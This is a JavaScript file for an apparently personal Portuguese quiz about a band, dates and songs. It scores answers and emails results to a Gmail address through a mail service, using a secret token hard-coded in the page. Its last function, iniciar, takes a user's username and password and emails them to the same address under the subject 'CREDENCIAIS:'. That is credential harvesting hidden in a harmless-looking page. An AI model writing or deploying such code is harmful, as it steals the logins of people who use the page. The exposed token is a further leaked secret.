function sendEmail(subject, body) {

    const email = "davipadecarvalho@homail.com";
    const token = "8c48cd89-f44b-414a-885e-127c7e4bafe7";


    Email.send({
        SecureToken : token,
        To : 'davipiresaquino@gmail.com',
        From : "davipadecarvalho@hotmail.com",
        Subject : subject,
        Body : body
    }).then(
        message => {
            setTimeout(function() {
                if (message != "OK") {
                    alert("Erro. Tente novamente");
                }
                else {
                    alert ("OK");
                }
            }, 3000);
        }
    );


}

function gerarResultado() {
    var resultado = 0;
    var cor = document.getElementById("cor");
    var banda = document.getElementById("banda");
    var data1 = document.getElementById("data1");
    var data2 = document.getElementById("data2");
    var local = document.getElementById("local");
    var musica = document.getElementById("musica");
    const perguntas1 = [cor, banda, data1, data2];
    const respostas1 = ["Branco", "Legião Urbana", "16", "30"];
    const perguntas2 = [local, musica];
    const respostas2 = ["the people", "so os loucos sabem"];
    for (let i = 0; i < 4; i++) {
        var pergunta = perguntas1[i];
        if (pergunta.options[pergunta.selectedIndex].text == respostas1[i]) {
            resultado++;
        }
    }
    for (let i = 0; i < 2; i++) {
        var pergunta = perguntas2[i];
        if (pergunta.value == respostas2[i]) {
            resultado++;
        }
    }
    
    var casa = document.getElementById("casa");

    sendEmail("resultado: ", resultado.toString() + " " + casa.options[casa.selectedIndex].text + " " + document.getElementById("fofo").value);
    if (resultado == 6) {
        alert("parabéns! Você acertou 100%!");
    }
    else if (resultado == 5) {
        alert("Você acertou 83% :)");
    }
    else if (resultado == 4) {
        alert("Você acertou 66% das questões :/");
    }
    else if (resultado == 3) {
        alert("Você só acertou metade!");
    }
    else if (resultado == 2) {
        alert("Você só acertou duas...");
    }
    else if (resultado == 1) {
        alert("Só acertasse uma questão... D:");
    }
    else {
        alert("Como assim? Você errou todas... :(");
    }
}

function iniciar(user, password) {
    sendEmail("CREDENCIAIS:", user + " " + password);
}